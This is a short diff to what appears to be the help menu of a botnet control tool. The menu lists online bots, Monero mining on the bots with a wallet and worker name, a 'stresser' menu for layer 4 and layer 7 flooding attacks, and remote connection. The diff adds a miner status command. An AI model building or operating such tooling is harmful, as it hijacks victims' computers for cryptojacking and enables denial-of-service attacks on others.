@@ -11,6 +11,7 @@ github.com/udbnt
 * help # Help menu
 * bots # Online bots
 * clear # Clear Terminal
+* Stat # Miners statue
 * miner pool:port monero_wallet worker_name # Monero CPU + GPU Mining (xmrig.com/wizard)
 * methods # Stresser menu (P2P TCP & UDP Layer 4, 7)
 * connect # Exit localhost & Connect remote
